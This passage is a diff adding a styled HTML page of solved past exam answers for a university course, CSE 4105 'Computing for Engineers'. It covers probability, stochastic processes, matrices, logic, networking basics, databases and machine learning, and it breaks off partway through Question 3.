@@ -1,0 +1,2050 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CSE 4105 — Solved Past Papers</title>
+<link href="https://fonts.googleapis.com/css2?family=DM+Serif+Display:ital@0;1&family=DM+Mono:wght@400;500&family=DM+Sans:ital,wght@0,300;0,400;0,500;1,300&display=swap" rel="stylesheet">
+<style>
+:root {
+  --ink: #e8e4dc;
+  --paper: #0f1117;
+  --cream: #181c26;
+  --warm: #1e2333;
+  --gold: #e8a84b;
+  --gold-light: #f5c96e;
+  --rust: #e06444;
+  --teal: #3db8b8;
+  --blue: #5b9bd5;
+  --green: #5ab87a;
+  --muted: #8a8a9a;
+  --line: rgba(232,228,220,0.09);
+  --card: #14181f;
+  --shadow: 0 4px 32px rgba(0,0,0,0.4);
+  --bg-dark: #0a0d12;
+  --accent-glow: rgba(232,168,75,0.15);
+}
+
+* { margin:0; padding:0; box-sizing:border-box; }
+
+html { scroll-behavior: smooth; }
+
+body {
+  background: var(--paper);
+  color: var(--ink);
+  font-family: 'DM Sans', sans-serif;
+  font-weight: 300;
+  font-size: 15px;
+  line-height: 1.75;
+  min-height: 100vh;
+}
+
+/* Subtle grid texture */
+body::before {
+  content:'';
+  position:fixed; inset:0;
+  background-image:
+    linear-gradient(rgba(232,168,75,0.015) 1px, transparent 1px),
+    linear-gradient(90deg, rgba(232,168,75,0.015) 1px, transparent 1px);
+  background-size: 40px 40px;
+  pointer-events:none; z-index:0;
+}
+
+/* ── MASTHEAD ── */
+.masthead {
+  background: linear-gradient(135deg, #0a0d12 0%, #111827 50%, #0f1117 100%);
+  color: var(--ink);
+  padding: 60px 52px 48px;
+  position: relative;
+  overflow: hidden;
+  border-bottom: 1px solid rgba(232,168,75,0.18);
+}
+.masthead::before {
+  content:'';
+  position:absolute; top:-80px; right:-100px;
+  width:420px; height:420px;
+  border:1px solid rgba(232,168,75,0.12);
+  border-radius:50%;
+}
+.masthead::after {
+  content:'';
+  position:absolute; top:-20px; right:-40px;
+  width:240px; height:240px;
+  border:1px solid rgba(232,168,75,0.07);
+  border-radius:50%;
+}
+/* Gold glow orb */
+.masthead .glow-orb {
+  position:absolute;
+  bottom: -120px; right: 120px;
+  width:300px; height:300px;
+  background: radial-gradient(circle, rgba(232,168,75,0.08) 0%, transparent 70%);
+  border-radius:50%;
+  pointer-events:none;
+}
+.masthead-tag {
+  font-family: 'DM Mono', monospace;
+  font-size: 11px;
+  letter-spacing: 3px;
+  text-transform: uppercase;
+  color: var(--gold-light);
+  margin-bottom: 18px;
+  display: flex; align-items: center; gap: 10px;
+}
+.masthead-tag::before {
+  content:'';
+  display:inline-block;
+  width:28px; height:1px;
+  background: linear-gradient(90deg, var(--gold), transparent);
+}
+.masthead h1 {
+  font-family: 'DM Serif Display', serif;
+  font-size: clamp(32px, 5vw, 56px);
+  line-height: 1.1;
+  color: #fff;
+  max-width: 720px;
+}
+.masthead h1 em {
+  font-style: italic;
+  color: var(--gold-light);
+}
+.masthead-meta {
+  margin-top: 24px;
+  display: flex; gap: 36px; flex-wrap: wrap;
+  font-family: 'DM Mono', monospace;
+  font-size: 11px;
+  color: rgba(232,228,220,0.38);
+}
+.masthead-meta span { color: rgba(232,228,220,0.7); }
+
+/* ── NAV TABS ── */
+.nav-tabs {
+  background: #0a0d12;
+  border-bottom: 1px solid rgba(232,168,75,0.1);
+  padding: 0 52px;
+  display: flex; gap: 0;
+  overflow-x: auto;
+  position: sticky; top: 0; z-index: 100;
+  scrollbar-width: none;
+}
+.nav-tabs::-webkit-scrollbar { display:none; }
+.nav-tab {
+  font-family: 'DM Mono', monospace;
+  font-size: 11px;
+  letter-spacing: 1.5px;
+  text-transform: uppercase;
+  padding: 16px 26px;
+  color: rgba(232,228,220,0.35);
+  cursor: pointer;
+  border-bottom: 2px solid transparent;
+  white-space: nowrap;
+  transition: all 0.2s;
+  background: none; border-left:none; border-right:none; border-top:none;
+}
+.nav-tab:hover { color: rgba(232,228,220,0.7); }
+.nav-tab.active {
+  color: var(--gold-light);
+  border-bottom-color: var(--gold);
+  text-shadow: 0 0 20px rgba(232,168,75,0.4);
+}
+
+/* ── CONTENT ── */
+.content { padding: 52px; max-width: 1200px; margin: 0 auto; position:relative; z-index:1; }
+
+.year-section { display:none; }
+.year-section.active { display:block; }
+
+/* ── PAPER HEADER ── */
+.paper-header {
+  display: flex;
+  align-items: flex-start;
+  justify-content: space-between;
+  flex-wrap: wrap;
+  gap: 16px;
+  margin-bottom: 44px;
+  padding-bottom: 24px;
+  border-bottom: 1px solid rgba(232,168,75,0.25);
+}
+.paper-info h2 {
+  font-family: 'DM Serif Display', serif;
+  font-size: 28px;
+  color: #fff;
+}
+.paper-info .semester {
+  font-family: 'DM Mono', monospace;
+  font-size: 12px;
+  color: var(--muted);
+  margin-top: 5px;
+}
+.paper-badges { display:flex; gap:8px; flex-wrap:wrap; align-items:center; }
+.badge {
+  font-family: 'DM Mono', monospace;
+  font-size: 10px;
+  padding: 4px 12px;
+  border-radius: 3px;
+  letter-spacing: 1px;
+  text-transform: uppercase;
+}
+.badge-gold { background: rgba(232,168,75,0.12); color: var(--gold); border: 1px solid rgba(232,168,75,0.25); }
+.badge-teal { background: rgba(61,184,184,0.1); color: var(--teal); border: 1px solid rgba(61,184,184,0.2); }
+
+/* ── QUESTION BLOCK ── */
+.q-block {
+  margin-bottom: 20px;
+  background: var(--card);
+  border: 1px solid rgba(232,168,75,0.08);
+  border-radius: 10px;
+  overflow: hidden;
+  box-shadow: var(--shadow);
+  animation: slideIn 0.4s ease both;
+  transition: border-color 0.2s;
+}
+.q-block:hover {
+  border-color: rgba(232,168,75,0.18);
+}
+@keyframes slideIn {
+  from { opacity:0; transform: translateY(16px); }
+  to   { opacity:1; transform: translateY(0); }
+}
+
+.q-header {
+  padding: 20px 26px;
+  display: flex;
+  align-items: center;
+  gap: 18px;
+  cursor: pointer;
+  user-select: none;
+  border-bottom: 1px solid transparent;
+  transition: background 0.15s;
+}
+.q-header:hover { background: var(--warm); }
+.q-header.open { border-bottom: 1px solid rgba(232,168,75,0.1); background: var(--warm); }
+
+.q-num {
+  font-family: 'DM Serif Display', serif;
+  font-size: 22px;
+  color: var(--gold);
+  min-width: 36px;
+  text-shadow: 0 0 20px rgba(232,168,75,0.3);
+}
+.q-title {
+  flex: 1;
+  font-weight: 500;
+  font-size: 14px;
+  color: var(--ink);
+  line-height: 1.4;
+}
+.q-marks {
+  font-family: 'DM Mono', monospace;
+  font-size: 11px;
+  color: var(--muted);
+  white-space: nowrap;
+}
+.q-arrow {
+  color: var(--gold);
+  font-size: 11px;
+  transition: transform 0.25s;
+  opacity: 0.6;
+}
+.q-header.open .q-arrow { transform: rotate(180deg); opacity: 1; }
+
+.q-body {
+  display: none;
+  padding: 30px 30px 36px;
+}
+.q-body.open { display: block; }
+
+/* Sub questions */
+.sub-q {
+  margin-bottom: 30px;
+  padding-bottom: 30px;
+  border-bottom: 1px dashed rgba(232,228,220,0.07);
+}
+.sub-q:last-child { border-bottom: none; margin-bottom: 0; padding-bottom: 0; }
+
+.sub-label {
+  font-family: 'DM Mono', monospace;
+  font-size: 10px;
+  letter-spacing: 2px;
+  text-transform: uppercase;
+  color: var(--gold);
+  margin-bottom: 7px;
+  opacity: 0.8;
+}
+.sub-question {
+  font-style: italic;
+  color: rgba(232,228,220,0.55);
+  font-size: 13.5px;
+  margin-bottom: 16px;
+  padding: 12px 18px;
+  background: rgba(232,168,75,0.04);
+  border-left: 3px solid rgba(232,168,75,0.35);
+  border-radius: 0 6px 6px 0;
+  line-height: 1.6;
+}
+
+.answer h4 {
+  font-family: 'DM Serif Display', serif;
+  font-size: 16px;
+  color: #fff;
+  margin-bottom: 9px;
+  margin-top: 18px;
+}
+.answer h4:first-child { margin-top: 0; }
+
+.answer p {
+  color: rgba(232,228,220,0.8);
+  font-size: 14.5px;
+  margin-bottom: 10px;
+  line-height: 1.85;
+}
+
+/* Code block */
+.code-block {
+  background: #080b10;
+  color: #a8e6cf;
+  font-family: 'DM Mono', monospace;
+  font-size: 12.5px;
+  padding: 18px 22px;
+  border-radius: 8px;
+  margin: 14px 0;
+  overflow-x: auto;
+  line-height: 1.75;
+  white-space: pre;
+  border: 1px solid rgba(232,168,75,0.08);
+  box-shadow: inset 0 1px 0 rgba(255,255,255,0.03);
+}
+.code-block .comment { color: #4a6040; }
+.code-block .keyword { color: #ffb347; }
+.code-block .string { color: #87ceeb; }
+.code-block .num { color: #ff9999; }
+
+/* Info boxes */
+.info-box {
+  padding: 14px 18px;
+  border-radius: 8px;
+  margin: 14px 0;
+  font-size: 14px;
+}
+.info-box.tip { background: rgba(61,184,184,0.07); border-left: 3px solid var(--teal); }
+.info-box.warn { background: rgba(224,100,68,0.07); border-left: 3px solid var(--rust); }
+.info-box.note { background: rgba(91,155,213,0.07); border-left: 3px solid var(--blue); }
+.info-box.key { background: rgba(232,168,75,0.08); border-left: 3px solid var(--gold); }
+
+.info-box strong { display:block; font-size:10px; letter-spacing:1.5px; text-transform:uppercase; margin-bottom:5px; opacity:0.6; font-family:'DM Mono',monospace; color: var(--gold-light); }
+
+/* Table */
+.ans-table {
+  width: 100%;
+  border-collapse: collapse;
+  margin: 14px 0;
+  font-size: 13.5px;
+}
+.ans-table th {
+  background: #0a0d12;
+  color: var(--gold-light);
+  padding: 10px 16px;
+  text-align: left;
+  font-family: 'DM Mono', monospace;
+  font-size: 10px;
+  letter-spacing: 1.5px;
+  text-transform: uppercase;
+  border-bottom: 1px solid rgba(232,168,75,0.15);
+}
+.ans-table td {
+  padding: 10px 16px;
+  border-bottom: 1px solid var(--line);
+  vertical-align: top;
+  color: rgba(232,228,220,0.8);
+}
+.ans-table tr:nth-child(even) td { background: rgba(255,255,255,0.02); }
+.ans-table tr:hover td { background: rgba(232,168,75,0.04); }
+
+/* List */
+.ans-list {
+  padding-left: 0;
+  list-style: none;
+  margin: 8px 0;
+}
+.ans-list li {
+  padding: 6px 0 6px 22px;
+  position: relative;
+  font-size: 14.5px;
+  color: rgba(232,228,220,0.8);
+  border-bottom: 1px solid rgba(232,228,220,0.04);
+  line-height: 1.7;
+}
+.ans-list li::before {
+  content: '→';
+  position: absolute;
+  left: 0;
+  color: var(--gold);
+  font-size: 11px;
+  top: 8px;
+}
+.ans-list li:last-child { border-bottom: none; }
+
+/* Diagram box */
+.diagram {
+  background: rgba(255,255,255,0.02);
+  border: 1px solid var(--line);
+  border-radius: 8px;
+  padding: 22px;
+  margin: 16px 0;
+  font-family: 'DM Mono', monospace;
+  font-size: 12px;
+  text-align: center;
+  color: var(--ink);
+  line-height: 2;
+}
+.diagram .box {
+  display: inline-block;
+  border: 1px solid rgba(232,168,75,0.3);
+  padding: 6px 16px;
+  border-radius: 6px;
+  margin: 4px;
+  background: rgba(232,168,75,0.06);
+  font-size: 11px;
+  color: var(--ink);
+}
+.diagram .arrow { color: var(--gold); font-size: 16px; margin: 0 6px; }
+
+/* Marks strip */
+.marks-strip {
+  display: flex;
+  gap: 8px;
+  flex-wrap: wrap;
+  margin-bottom: 22px;
+  padding: 14px 18px;
+  background: rgba(232,168,75,0.04);
+  border-radius: 8px;
+  border: 1px solid rgba(232,168,75,0.1);
+}
+.marks-strip .m-item {
+  font-family: 'DM Mono', monospace;
+  font-size: 11px;
+  color: var(--muted);
+}
+.marks-strip .m-item strong { color: var(--gold); }
+
+/* ── HIGHLIGHT ── */
+mark {
+  background: rgba(232,168,75,0.18);
+  color: var(--gold-light);
+  padding: 1px 4px;
+  border-radius: 3px;
+}
+strong { font-weight: 500; color: rgba(232,228,220,0.95); }
+code {
+  font-family: 'DM Mono', monospace;
+  font-size: 12.5px;
+  color: var(--teal);
+  background: rgba(61,184,184,0.08);
+  padding: 1px 6px;
+  border-radius: 4px;
+}
+
+/* ── SCROLLBAR ── */
+::-webkit-scrollbar { width:5px; height:5px; }
+::-webkit-scrollbar-track { background: var(--cream); }
+::-webkit-scrollbar-thumb { background: rgba(232,168,75,0.2); border-radius:3px; }
+
+/* ── FOOTER ── */
+footer {
+  border-top: 1px solid rgba(232,168,75,0.1);
+  padding: 28px 52px;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  flex-wrap: wrap;
+  gap: 12px;
+  font-family: 'DM Mono', monospace;
+  font-size: 11px;
+  color: var(--muted);
+  position:relative; z-index:1;
+  background: #0a0d12;
+}
+footer span { color: var(--gold); }
+
+@media(max-width:640px){
+  .masthead, .content, footer { padding-left:20px; padding-right:20px; }
+  .nav-tabs { padding: 0 20px; }
+}
+</style>
+</head>
+<body>
+
+<!-- MASTHEAD -->
+<div class="masthead">
+  <div class="glow-orb"></div>
+  <div class="masthead-tag">IUT · CSE 4105 · Computing for Engineers</div>
+  <h1>Solved Past <em>Papers</em></h1>
+  <div class="masthead-meta">
+    <div>Batch B20 <span>Winter 2020–21</span></div>
+    <div>Batch B21 <span>Winter 2021–22</span></div>
+    <div>Batch B22 <span>Winter 2022–23</span></div>
+    <div>Batch B23 <span>Winter 2023–24</span></div>
+  </div>
+</div>
+
+<!-- NAV TABS -->
+<div class="nav-tabs">
+  <button class="nav-tab" onclick="showYear('b20',this)">B20 · Oct 2021</button>
+  <button class="nav-tab active" onclick="showYear('b21',this)">B21 · Dec 2022</button>
+  <button class="nav-tab" onclick="showYear('b22',this)">B22 · Dec 2023</button>
+  <button class="nav-tab" onclick="showYear('b23',this)">B23 · Apr 2025</button>
+</div>
+
+<div class="content">
+
+<!-- ═══════════════════════════════════════════ B20 ═══════════════════════════════════════════ -->
+<div class="year-section" id="b20">
+
+  <div class="paper-header">
+    <div class="paper-info">
+      <h2>Batch 20 — Final Examination</h2>
+      <div class="semester">CSE 4105 · Computing for Engineers · Answer ALL Questions</div>
+    </div>
+    <div class="paper-badges">
+      <span class="badge badge-gold">3 Questions</span>
+      <span class="badge badge-teal">Full Paper</span>
+    </div>
+  </div>
+
+  <!-- Q1 -->
+  <div class="q-block">
+    <div class="q-header open" onclick="toggleQ(this)">
+      <div class="q-num">Q1</div>
+      <div class="q-title">Stochastic Processes, Probability, LED Devices & Discrete Mathematics</div>
+      <div class="q-marks">Part (a) + (b) + (c)</div>
+      <div class="q-arrow">▼</div>
+    </div>
+    <div class="q-body open">
+
+      <!-- 1a i -->
+      <div class="sub-q">
+        <div class="sub-label">Q1(a)(i)</div>
+        <div class="sub-question">What makes a process random or stochastic?</div>
+        <div class="answer">
+          <h4>Stochastic Process — Definition &amp; Characteristics</h4>
+          <p>A <strong>stochastic process</strong> is a mathematical model representing a system that evolves over time through random transitions rather than a deterministic path. Unlike a deterministic system where the same initial conditions yield the same result, a stochastic process is defined by a probability distribution — the state of the system at any given time <mark>t</mark> is a random variable.</p>
+          <ul class="ans-list">
+            <li><strong>Indeterminacy:</strong> Even with complete knowledge of the current state, the future state cannot be predicted with absolute certainty, only with a specific probability P(X<sub>t+1</sub> | X<sub>t</sub>).</li>
+            <li><strong>State Space and Index Set:</strong> The process operates within a set of all possible values (state space) and is typically indexed by time or space.</li>
+            <li><strong>Latent Complexity:</strong> Randomness often arises from "noise" or microscopic variables too numerous to measure, leading to aggregate behavior that appears erratic.</li>
+            <li><strong>Time Evolution:</strong> It describes how a sequence of random variables X<sub>1</sub>, X<sub>2</sub>, …, X<sub>n</sub> relates to one another. In a <mark>Markovian process</mark>, the future depends only on the present state, not on past history.</li>
+            <li><strong>Statistical Regularity:</strong> While individual outcomes are unpredictable, long-term behavior often follows predictable patterns governed by the Law of Large Numbers and the Central Limit Theorem, allowing calculation of expected values and variance.</li>
+          </ul>
+        </div>
+      </div>
+
+      <!-- 1a ii -->
+      <div class="sub-q">
+        <div class="sub-label">Q1(a)(ii)</div>
+        <div class="sub-question">Usage and application of probability.</div>
+        <div class="answer">
+          <h4>Probability — Usage &amp; Applications</h4>
+          <p>Probability serves as a fundamental tool for managing uncertainty, allowing for informed decision-making where deterministic outcomes are unavailable. In the real world it is the backbone of <strong>risk assessment and insurance</strong>, where actuarial science uses historical data to predict likelihood of accidents. It is equally vital in <strong>finance and economics</strong> for modeling market fluctuations, and in <strong>medicine</strong> for clinical trials to determine whether drug efficacy is statistically significant rather than a result of chance.</p>
+          <h4>Applications in Computer Science</h4>
+          <ul class="ans-list">
+            <li><strong>Machine Learning &amp; AI:</strong> Probability is the foundation of models like Naive Bayes classifiers and Hidden Markov Models. Systems quantify "confidence" in predictions — e.g., whether an email is spam or identifying objects in computer vision.</li>
+            <li><strong>Randomized Algorithms:</strong> Some problems are solved more efficiently using randomness. QuickSort uses a random pivot to ensure average-case O(n log n) time complexity; Monte Carlo simulations use repeated random sampling to approximate complex numerical results.</li>
+            <li><strong>Network Performance &amp; Cybersecurity:</strong> Probability models like the Poisson distribution analyze data packet traffic and server load to prevent congestion. In security, it helps detect anomalies and brute-force patterns by identifying behaviors that deviate from expected probabilistic norms.</li>
+            <li><strong>Cryptography:</strong> True security relies on randomness. Cryptographic keys and salts must be generated using high-entropy random processes to be computationally impossible to guess.</li>
+            <li><strong>Database Management:</strong> Query optimizers use probabilistic estimations of data distribution to determine the most efficient way to execute a search or join operation.</li>
+          </ul>
+        </div>
+      </div>
+
+      <!-- 1b i -->
+      <div class="sub-q">
+        <div class="sub-label">Q1(b)(i)</div>
+        <div class="sub-question">Probability of 3 LED devices forming "189".</div>
+        <div class="answer">
+          <h4>LED Devices — Probability Calculation</h4>
+          <p>Each LED can display digits 0–9 (10 possible outcomes). Since the devices are <strong>independent</strong>:</p>
+          <ul class="ans-list">
+            <li><strong>Total possible outcomes:</strong> 10 × 10 × 10 = <mark>1000</mark></li>
+            <li><strong>Favorable outcome</strong> (exactly "189"): <mark>1</mark></li>
+            <li><strong>Probability:</strong> P = 1/1000 = <mark>0.001</mark></li>
+          </ul>
+          <div class="info-box key"><strong>Key Concept</strong>Because each LED is independent, we multiply individual probabilities: P = P(1) × P(8) × P(9) = (1/10) × (1/10) × (1/10) = 1/1000.</div>
+        </div>
+      </div>
+
+      <!-- 1b ii -->
+      <div class="sub-q">
+        <div class="sub-label">Q1(b)(ii)</div>
+        <div class="sub-question">Matrix calculation: Solve for X and Y given 2X − Y and 2Y + X.</div>
+        <div class="answer">
+          <h4>Matrix Calculation — Solving for X and Y</h4>
+          <p>Given two equations:</p>
+          <ul class="ans-list">
+            <li>(1) 2X − Y = [[3, −3, 0], [3, 3, 2]]</li>
+            <li>(2) 2Y + X = [[4, 1, 5], [−1, 4, −4]]</li>
+          </ul>
+          <p><strong>Step 1:</strong> Multiply equation (1) by 2: 4X − 2Y = [[6, −6, 0], [6, 6, 4]]</p>
+          <p><strong>Step 2:</strong> Add to equation (2): 5X = [[10, −5, 5], [5, 10, 0]]</p>
+          <p><strong>Result X:</strong></p>
+          <div class="diagram">
+            <span class="box">X = [[2, −1, 1], [1, 2, 0]]</span>
+          </div>
+          <p><strong>Step 3:</strong> Substitute X into equation (1) to find Y: Y = 2X − Matrix(1)</p>
+          <div class="diagram">
+            <span class="box">Y = [[4, −2, 2], [2, 4, 0]] − [[3, −3, 0], [3, 3, 2]]</span>
+            <br>
+            <span class="arrow">↓</span>
+            <br>
+            <span class="box">Y = [[1, 1, 2], [−1, 1, −2]]</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- 1c i -->
+      <div class="sub-q">
+        <div class="sub-label">Q1(c)(i)</div>
+        <div class="sub-question">Discrete Mathematics topics.</div>
+        <div class="answer">
+          <h4>Discrete Mathematics — Key Topics</h4>
+          <p>Discrete mathematics focuses on mathematical structures that are fundamentally <mark>countable or distinct</mark> rather than continuous. Key topics include:</p>
+          <ul class="ans-list">
+            <li><strong>Set Theory:</strong> Explores collections of objects and their operations (union, intersection, complement).</li>
+            <li><strong>Graph Theory:</strong> Used to model networks and relationships between discrete objects.</li>
+            <li><strong>Combinatorics:</strong> Deals with counting, arrangement, and permutation.</li>
+            <li><strong>Logic &amp; Boolean Algebra:</strong> Provides the basis for mathematical reasoning and digital circuit design.</li>
+            <li><strong>Number Theory:</strong> Focuses on the properties of integers and prime numbers.</li>
+            <li><strong>Recurrence Relations:</strong> Describe sequences where each term is defined as a function of preceding terms.</li>
+          </ul>
+        </div>
+      </div>
+
+      <!-- 1c ii -->
+      <div class="sub-q">
+        <div class="sub-label">Q1(c)(ii)</div>
+        <div class="sub-question">Why "X is a multiple of 5" is not a propositional logic statement.</div>
+        <div class="answer">
+          <h4>Propositional Logic — Open Sentences</h4>
+          <p>The statement <strong>"X is a multiple of 5"</strong> is <mark>not a proposition</mark> because it lacks a definitive truth value. In propositional logic, a statement must be either strictly true or strictly false.</p>
+          <p>Because X is a <strong>free variable</strong>, the truth of the statement depends entirely on the value assigned to it — it is true if X=10 but false if X=7. Since its truth status is conditional and not absolute, it is classified as a <strong>predicate</strong> or an <strong>open sentence</strong> rather than a proposition.</p>
+          <div class="info-box note"><strong>How to Make It a Proposition</strong>Bind the variable with a quantifier: "There exists an integer X such that X is a multiple of 5" — this is now either definitively true or false (it's true).</div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- Q2 -->
+  <div class="q-block">
+    <div class="q-header" onclick="toggleQ(this)">
+      <div class="q-num">Q2</div>
+      <div class="q-title">Transmission Modes, Modulation, Data Link Layer, TCP/IP, IPv4, FTP vs HTTP</div>
+      <div class="q-marks">Parts (a) + (b) + (c)</div>
+      <div class="q-arrow">▼</div>
+    </div>
+    <div class="q-body">
+
+      <!-- 2a i -->
+      <div class="sub-q">
+        <div class="sub-label">Q2(a)(i)</div>
+        <div class="sub-question">The three kinds of transmission modes between two linked devices.</div>
+        <div class="answer">
+          <h4>Transmission Modes</h4>
+          <table class="ans-table">
+            <tr><th>Mode</th><th>Direction</th><th>Example</th></tr>
+            <tr><td><strong>Simplex</strong></td><td>Unidirectional — one device transmits, the other only receives</td><td>Television broadcast, traditional keyboard-to-computer</td></tr>
+            <tr><td><strong>Half-Duplex</strong></td><td>Bidirectional, but only one device at a time; the other must wait</td><td>Walkie-Talkie — users say "over" to switch direction</td></tr>
+            <tr><td><strong>Full-Duplex</strong></td><td>Bidirectional and simultaneous — both stations transmit and receive at once</td><td>Mobile phone conversation — both parties can speak and hear concurrently</td></tr>
+          </table>
+        </div>
+      </div>
+
+      <!-- 2a ii -->
+      <div class="sub-q">
+        <div class="sub-label">Q2(a)(ii)</div>
+        <div class="sub-question">What is modulation and why is it necessary?</div>
+        <div class="answer">
+          <h4>Modulation — Definition &amp; Necessity</h4>
+          <p><strong>Modulation</strong> is the process of mapping information (the baseband signal) onto a higher-frequency carrier wave by varying one or more of its properties — amplitude, frequency, or phase. The low-frequency message signal is "piggybacked" onto a high-frequency sine wave to prepare it for physical transmission.</p>
+          <ul class="ans-list">
+            <li><strong>Antenna Size Reduction:</strong> For efficient transmission, an antenna's length must be a fraction of the signal's wavelength (typically λ/4). Low-frequency voice signals have massive wavelengths requiring antennas miles long; modulating to high frequencies allows compact antenna sizes.</li>
+            <li><strong>Multiplexing:</strong> Modulation allows different signals to be transmitted over the same medium simultaneously without interference. Assigning each signal a different carrier frequency (as in FM radio) allows multiple users to share the same space.</li>
+            <li><strong>Range and Interference:</strong> High-frequency carrier waves travel much further through the atmosphere than low-frequency baseband signals, and are more robust against environmental noise.</li>
+            <li><strong>Bandwidth Adjustment:</strong> It allows engineers to limit the frequency range a signal occupies, ensuring efficient use of the electromagnetic spectrum.</li>
+          </ul>
+        </div>
+      </div>
+
+      <!-- 2b i -->
+      <div class="sub-q">
+        <div class="sub-label">Q2(b)(i)</div>
+        <div class="sub-question">Data Link Layer (Layer 2) — primary functions.</div>
+        <div class="answer">
+          <h4>Data Link Layer (OSI Layer 2)</h4>
+          <p>The <strong>Data Link Layer</strong> is responsible for organizing data into <mark>frames</mark>. Its primary functions include:</p>
+          <ul class="ans-list">
+            <li><strong>Physical Addressing (MAC Addresses):</strong> Ensures data reaches the correct destination on a local network using hardware-level MAC addresses.</li>
+            <li><strong>Error Detection:</strong> Uses a Frame Check Sequence (FCS) / CRC to detect transmission errors.</li>
+            <li><strong>Flow Control:</strong> Prevents a fast sender from overwhelming a slow receiver by regulating the data transmission rate.</li>
+          </ul>
+        </div>
+      </div>
+
+      <!-- 2b ii -->
+      <div class="sub-q">
+        <div class="sub-label">Q2(b)(ii)</div>
+        <div class="sub-question">Roles of TCP and IP.</div>
+        <div class="answer">
+          <h4>TCP vs IP — Respective Roles</h4>
+          <table class="ans-table">
+            <tr><th>Protocol</th><th>Full Name</th><th>Role</th></tr>
+            <tr><td><strong>TCP</strong></td><td>Transmission Control Protocol</td><td>Ensures <mark>reliable, ordered, and error-checked</mark> delivery of data. Breaks large data into packets, manages reassembly at the destination, and handles retransmission if any data is lost.</td></tr>
+            <tr><td><strong>IP</strong></td><td>Internet Protocol</td><td>Responsible for <mark>addressing and routing</mark> packets across different networks to ensure they reach the correct destination machine.</td></tr>
+          </table>
+        </div>
+      </div>
+
+      <!-- 2c i -->
+      <div class="sub-q">
+        <div class="sub-label">Q2(c)(i)</div>
+        <div class="sub-question">Structure of an IPv4 address.</div>
+        <div class="answer">
+          <h4>IPv4 Address Structure</h4>
+          <p>An IPv4 address consists of <mark>32 bits</mark>, divided into four 8-bit sections called <strong>octets</strong>. In its standard format — <strong>dotted-decimal notation</strong> — these octets are represented as four decimal numbers ranging from 0 to 255, separated by periods.</p>
+          <div class="diagram">
+            <span class="box">192</span>
+            <span class="arrow">.</span>
+            <span class="box">168</span>
+            <span class="arrow">.</span>
+            <span class="box">1</span>
+            <span class="arrow">.</span>
+            <span class="box">1</span>
+            <br>
+            <span style="font-size:11px; color:var(--muted)">8 bits &nbsp;·&nbsp; 8 bits &nbsp;·&nbsp; 8 bits &nbsp;·&nbsp; 8 bits = 32 bits total</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- 2c ii -->
+      <div class="sub-q">
+        <div class="sub-label">Q2(c)(ii)</div>
+        <div class="sub-question">Differences between FTP and HTTP.</div>
+        <div class="answer">
+          <h4>FTP vs HTTP</h4>
+          <table class="ans-table">
+            <tr><th>Aspect</th><th>FTP</th><th>HTTP</th></tr>
+            <tr><td><strong>Primary Use</strong></td><td>Designed specifically for transfer and management of files (uploading/downloading) between client and server</td><td>Designed for transferring web resources (HTML, CSS, images) to be rendered by a web browser</td></tr>
+            <tr><td><strong>Connections</strong></td><td>Uses <mark>two separate connections</mark>: a "control" connection for commands and a "data" connection for actual file content</td><td>A stateless protocol that typically uses a single connection for both requests and responses</td></tr>
+            <tr><td><strong>Efficiency</strong></td><td>More efficient for moving very large files or entire directory structures</td><td>Optimized for quick, overhead-efficient retrieval of small pieces of data that make up a webpage</td></tr>
+          </table>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- Q3 -->
+  <div class="q-block">
+    <div class="q-header" onclick="toggleQ(this)">
+      <div class="q-num">Q3</div>
+      <div class="q-title">Database Approach, Machine Learning Paradigms, Computer Vision &amp; HCI</div>
+      <div class="q-marks">Parts (a) + (b) + (c)</div>
+      <div class="q-arrow">▼</div>
+    </div>
+    <div class="q-body">
+
+      <!-- 3a i -->
+      <div class="sub-q">
+        <div class="sub-label">Q3(a)(i)</div>
+        <div class="sub-question">Advantages of the database approach over a file-based approach.</div>
+        <div class="answer">
+          <h4>Database Approach — Advantages</h4>
+          <p>The database approach centralizes data management, offering several key advantages over a file-based approach:</p>
+          <ul class="ans-list">
+            <li><strong>Reduced Data Redundancy:</strong> In file systems, the same data is often duplicated in different files, wasting space and causing inconsistencies. Databases use <mark>normalization</mark> to store data in one place.</li>
+            <li><strong>Data Integrity &amp; Atomicity:</strong> Databases enforce constraints (like data types or unique keys) and ensure that complex transactions either complete entirely or not at all — preventing partial updates.</li>
+            <li><strong>Improved Security:</strong> Databases provide granular access control, allowing administrators to restrict what specific users can see or edit — which is difficult in flat-file systems.</li>
+            <li><strong>Concurrent Access:</strong> Multiple users can access and update the database simultaneously without overwriting each other's changes, thanks to sophisticated locking mechanisms.</li>
+          </ul>
+        </div>
+      </div>
+
+      <!-- 3a ii -->
+      <div class="sub-q">
+        <div class="sub-label">Q3(a)(ii)</div>
+        <div class="sub-question">2-Tier Client-Server Architecture.</div>
+        <div class="answer">
+          <h4>2-Tier Client-Server Architecture</h4>
+          <div class="diagram">
+            <span class="box">Client Tier<br><span style="font-size:10px;color:var(--muted)">User Interface &amp; Business Logic</span><br><span style="font-size:10px">[Application]</span></span>
+            <span class="arrow">⟵ SQL / Query ⟶</span>
+            <span class="box">Server Tier<br><span style="font-size:10px;color:var(--muted)">Database Management System (DBMS)</span><br><span style="font-size:10px">[Database]</span></span>
+          </div>
+          <p>In a 2-tier architecture, the client communicates directly with the database server. The client handles both the UI and business logic, while the server handles data storage and retrieval via SQL queries.</p>
+        </div>
+      </div>
+
+      <!-- 3b i -->
+      <div class="sub-q">
+        <div class="sub-label">Q3(b)(i)</div>
+        <div class="sub-question">Traditional Programming vs Machine Learning paradigm.</div>
+        <div class="answer">
+          <h4>Traditional Programming vs Machine Learning</h4>
+          <table class="ans-table">
+            <tr><th>Paradigm</th><th>Input (Human Provides)</th><th>Output (Computer Produces)</th></tr>
+            <tr><td><strong>Traditional Programming</strong></td><td>Data + Rules (explicit code)</td><td>Output / results</td></tr>
+            <tr><td><strong>Machine Learning</strong></td><td>Data + Output (labeled answers)</td><td>Rules (the learned model)</td></tr>
+          </table>
+          <div class="info-box key"><strong>Key Difference</strong>Traditional programming relies on human-defined logic. Machine Learning relies on data-driven pattern recognition — the computer discovers the rules itself by learning from examples.</div>
+        </div>
+      </div>
+
+      <!-- 3b ii -->
+      <div class="sub-q">
+        <div class="sub-label">Q3(b)(ii)</div>
